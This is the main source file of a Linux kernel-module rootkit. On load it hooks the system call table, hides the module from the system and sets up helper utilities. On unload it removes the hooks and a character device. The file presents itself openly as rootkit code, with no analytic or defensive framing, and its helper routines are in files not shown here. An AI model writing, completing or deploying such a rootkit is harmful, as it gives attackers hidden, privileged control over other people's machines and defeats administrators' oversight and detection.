#include <linux/init.h>
#include <linux/module.h>
#include "hook.h"
#include "symbols.h"
#include "utils.h"

MODULE_LICENSE("GPL");


static int __init rootkit_init(void)
{
    printk(KERN_ALERT "rootkit init\n");
    init_x64_sys_call();
    stop_machine(init_syscall_table, NULL, NULL);
    hide_module();
    utils_init();
    return 0;
}


static void __exit rootkit_exit(void)
{
    hook_release();
    chrdev_release();
    printk(KERN_ALERT "rookit exit\n");
}


module_init(rootkit_init);
module_exit(rootkit_exit);
